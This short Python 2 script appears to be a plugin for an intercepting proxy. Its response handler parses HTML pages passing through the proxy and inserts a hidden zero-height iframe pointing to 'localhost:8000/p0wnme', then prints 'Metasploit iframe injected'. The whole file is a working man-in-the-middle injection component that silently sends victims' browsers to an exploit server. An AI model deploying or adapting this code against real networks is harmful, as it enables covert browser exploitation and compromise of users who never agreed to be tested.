#!/usr/bin/python
import urllib2
from BeautifulSoup import BeautifulSoup
import support.header as header

### CHANGE AS NEEDED
url = 'http://www.google.com'
match = (("Content-type","TEXT/HTML"),)
code1 = '''<iframe height=0 src="http://localhost:8000/p0wnme"></iframe>'''



### FUNCTION TO MANIPULATE CLIENT REQUEST
def doRequest(session, request_header, data):
  return(request_header, data, 0, 0)



### FUNCTION TO MANIPULATE SERVER RESPONSE
def doResponse(session, request_header, response_header, data):
  changed = 0
  stop = 0

  ### DETERMINE IF WE NEED TO CHANGE DATA
  if header.headertest(response_header):

    ### MANIPULATE DATA - INSERT SCRIPT
    soup = BeautifulSoup(data)
    soup.body.insert(-1, code1)
    changed = 1
    data = str(soup)
    print("Metasploit iframe injected")

  ### RETURN DATA
  header.headerfix(response_header, "Content-Length", str(len(data)) + '\r\n')
  return(response_header, data, changed, stop)



#### MAIN PROGRAM - TO DELETE UPON INTEGRATION
#response = urllib2.urlopen(url)
#data = response.read()
#h = str(response.info()).splitlines(1)
#response_header = [ ("Request",response.geturl()) ]
#for x in h:
  #response_header.append(tuple(x.split(": ", 1)))

#(response_header, data, changed, stop) = doResponse(0, 0, response_header, data)
#print data
